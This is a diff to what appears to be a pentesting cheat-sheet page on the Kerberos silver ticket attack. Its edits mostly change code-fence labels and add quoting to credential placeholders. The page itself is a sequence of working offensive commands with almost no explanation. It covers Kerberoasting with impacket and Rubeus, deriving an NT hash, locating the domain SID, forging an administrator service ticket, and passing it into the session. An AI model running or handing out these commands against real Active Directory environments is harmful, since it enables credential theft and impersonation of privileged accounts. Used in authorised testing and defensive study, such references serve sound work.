@@ -4,7 +4,6 @@ date: 2024-7-30
 tags: ["silver ticket", "rubeus", "active directory", "ad", "domain controller", "Windows", "GetUserSPNs"]
 ---
 
----
 ### Silver Ticket Attack
 
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
@@ -15,13 +14,13 @@ tags: ["silver ticket", "rubeus", "active directory", "ad", "domain controller",
 
 <div>
 
-```bash
-sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC> -request -k
+```console
+sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -request -k
 ```
 
-```bash
+```console
 # If NTLM auth is disabled
-sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-host <DC> -request -k
+sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
 ```
 
 </div>
@@ -30,8 +29,8 @@ sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-host
 
 <div>
 
-```bash
-iconv -f ASCII -t UTF-16LE <(printf "<PASSWORD>") | openssl dgst -md4
+```console
+iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
 ```
 
 </div>
@@ -40,8 +39,8 @@ iconv -f ASCII -t UTF-16LE <(printf "<PASSWORD>") | openssl dgst -md4
 
 <div>
 
-```bash
-sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator <DOMAIN>/<USER>:<PASSWORD>
+```console
+sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator '<DOMAIN>/<USER>:<PASSWORD>'
 ```
 
 </div>
@@ -50,7 +49,7 @@ sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator <DOMAIN>/<USER
 
 <div>
 
-```bash
+```console
 impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> -spn <SPN> administrator
 ```
 
@@ -60,7 +59,7 @@ impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> 
 
 <div>
 
-```bash
+```console
 export KRB5CCNAME=administrator.ccache
 ```
 
@@ -70,7 +69,7 @@ export KRB5CCNAME=administrator.ccache
 
 <div>
 
-```bash
+```console
 klist
 ```
 
@@ -83,8 +82,8 @@ klist
 
 <div>
 
-```powershell
-.\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /nowrap
+```console
+.\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>' /nowrap
 ```
 
 </div>
@@ -93,8 +92,8 @@ klist
 
 <div>
 
-```powershell
-.\rubeus.exe hash /password:<PASSWORD>
+```console
+.\rubeus.exe hash /password:'<PASSWORD>'
 ```
 
 </div>
@@ -105,11 +104,11 @@ klist
 
 <div>
 
-```powershell
+```console
 import-module activedirectory
 ```
 
-```powershell
+```console
 Get-ADDomain | fl DomainSID
 ```
 
@@ -119,19 +118,19 @@ Get-ADDomain | fl DomainSID
 
 <div>
 
-```powershell
+```console
 # Install ldp.exe (Windows 11)
 Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services'
 ```
 
-```powershell 
+```console
 # Bind > Bind with credentials
 ldp.exe
 ```
 
-```powershell
+```console
 # Browse > Search
-BaseDN: DC=<example>,DC=<com>
+BaseDN: DC=<EXAMPLE>,DC=<COM>
 Filter: (objectclass=User)
 ```
 
@@ -141,7 +140,7 @@ Filter: (objectclass=User)
 
 <div>
 
-```powershell
+```console
 .\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:<SPN> /nowrap /ptt
 ```
 
@@ -151,7 +150,7 @@ Filter: (objectclass=User)
 
 <div>
 
-```powershell
+```console
 klist
 ```
 
